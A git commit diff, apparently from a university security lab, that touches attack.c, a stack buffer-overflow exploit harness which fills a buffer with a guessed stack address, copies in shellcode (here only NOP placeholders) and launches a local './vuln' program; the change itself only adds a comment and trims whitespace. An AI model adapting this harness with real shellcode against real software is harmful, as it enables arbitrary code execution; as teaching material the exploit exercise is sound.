56f78e13005f1129705c231e18cc1d314afdd42e
Huzeyfe Kocabas <hkocabas@indiana.edu>
2018-01-29 10:31:57 -0500

    Checking the change that is done for testing Git

--- attack.c
+++ attack.c
@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
+//find the differences
 char shellcode[]="\x90\x90\x90\x90\x90\x90\x90\x90"
 "\x90\x90\x90\x90\x90\x90\x90\x90"
 "\x90\x90\x90\x90\x90\x90\x90\x90"
@@ -8,12 +9,12 @@ char shellcode[]="\x90\x90\x90\x90\x90\x90\x90\x90"
 "\x90\x90\x90\x90\x90\x90\x90\x90";
 //Replace the above NOP buffer with your shell code.
 
-unsigned long get_sp(void) { 
-  __asm__("movq %rsp,%rax"); 
-} 
+unsigned long get_sp(void) {
+  __asm__("movq %rsp,%rax");
+}
 
-void main(int argc, char *argv[]) 
-{ 
+void main(int argc, char *argv[])
+{
   int bsize=0, offset=0,i=0,j=0;
   char *buff, *ptr;
   long long *addr,*addr_ptr;
@@ -22,23 +23,23 @@ void main(int argc, char *argv[])
       printf("\n\nUsage is either attack [buffer_size]\n or attack [buffer_size] [stack_offset]\n");
       exit(0);
     }
-  if (argc > 1) bsize = atoi(argv[1]); 
-  if (argc > 2) offset = atoi(argv[2]); 
-      buff = malloc(bsize); 
+  if (argc > 1) bsize = atoi(argv[1]);
+  if (argc > 2) offset = atoi(argv[2]);
+      buff = malloc(bsize);
       addr = get_sp() -offset;
-      printf("\nUsing address as guess for beginning of attack buffer: 0x%x\n", addr); 
-      ptr = buff; 
-      addr_ptr = (long long *) ptr; 
-      
-      for (i = 0; i < bsize-8; i+=8) 
-	*(addr_ptr++) = 0xFFFFFFFFFFFFFFFF; 
+      printf("\nUsing address as guess for beginning of attack buffer: 0x%x\n", addr);
+      ptr = buff;
+      addr_ptr = (long long *) ptr;
+
+      for (i = 0; i < bsize-8; i+=8)
+	*(addr_ptr++) = 0xFFFFFFFFFFFFFFFF;
       *(addr_ptr)=addr;
 
-      for (i = 0; i < strlen(shellcode); i++) 
-	*(ptr++) = shellcode[i]; 
-      
-      buff[bsize - 1] = (char*)NULL; 
-      
+      for (i = 0; i < strlen(shellcode); i++)
+	*(ptr++) = shellcode[i];
+
+      buff[bsize - 1] = (char*)NULL;
+
       execl("./vuln","./vuln", buff, NULL);
       return;
 }
